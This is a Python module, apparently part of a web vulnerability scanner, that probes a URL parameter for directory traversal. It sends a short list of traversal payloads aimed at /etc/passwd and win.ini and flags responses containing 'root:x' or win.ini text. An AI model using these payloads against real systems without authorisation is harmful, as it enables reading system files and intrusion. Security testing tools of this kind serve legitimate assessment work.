import asyncio
import aiohttp
from logs.logger_config import logger

# Define payloads
PAYLOADS = [
    "../../etc/passwd",        # Linux
    "../../windows/win.ini",   # Windows
    "..%2f..%2fetc%2fpasswd",  # URL Encoded Linux
    "..\\..\\windows\\win.ini" # Windows Backslashes
]

async def check_directory_traversal(target_url: str, param: str, payload: str, session: aiohttp.ClientSession) -> dict:
    """Check individual payload and return formatted result"""
    test_url = f"{target_url}?{param}={payload}"
    result = {
        "url": test_url,
        "vulnerable": False
    }
    
    try:
        async with session.get(test_url, timeout=5) as response:
            content = await response.text()
            
            # Check for vulnerability indicators
            if "root:x" in content or "for 16-bit app support" in content:
                result["vulnerable"] = True
                logger.warning(f"VULNERABLE: {test_url}")
            else:
                logger.info(f"Clean: {test_url}")
                
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"Request failed for {test_url}: {str(e)}")
    except Exception as e:
        logger.error(f"Unexpected error for {test_url}: {str(e)}")
    
    return result

async def scan_directory_traversal(target_url: str, param: str) -> dict:
    """Main scanning function using async requests"""
    async with aiohttp.ClientSession() as session:
        tasks = []
        vulnerable_urls = []
        
        for payload in PAYLOADS:
            task = asyncio.create_task(check_directory_traversal(target_url, param, payload, session))
            tasks.append(task)
        
        # Gather all results
        results = await asyncio.gather(*tasks)
        
        # Extract vulnerable URLs
        for res in results:
            if res.get("vulnerable", False):
                vulnerable_urls.append(res["url"])
    
    return {
        "status": "success" if vulnerable_urls else "no_vulnerabilities",
        "vulnerable_urls": vulnerable_urls,
        "total_payloads": len(PAYLOADS),
        "tested_urls": [res["url"] for res in results]
    }

async def run_dtscan(target_url: str, param: str) -> dict:
    """Entry point for the scan (async)"""
    logger.info(f"Starting directory traversal scan for {target_url}")
    scan_result = await scan_directory_traversal(target_url, param)
    logger.info(f"Scan completed. Results: {scan_result}")
    return scan_result

def run_dtscan_sync(target_url: str, param: str) -> dict:
    """Synchronous wrapper for the scan"""
    return asyncio.run(run_dtscan(target_url, param))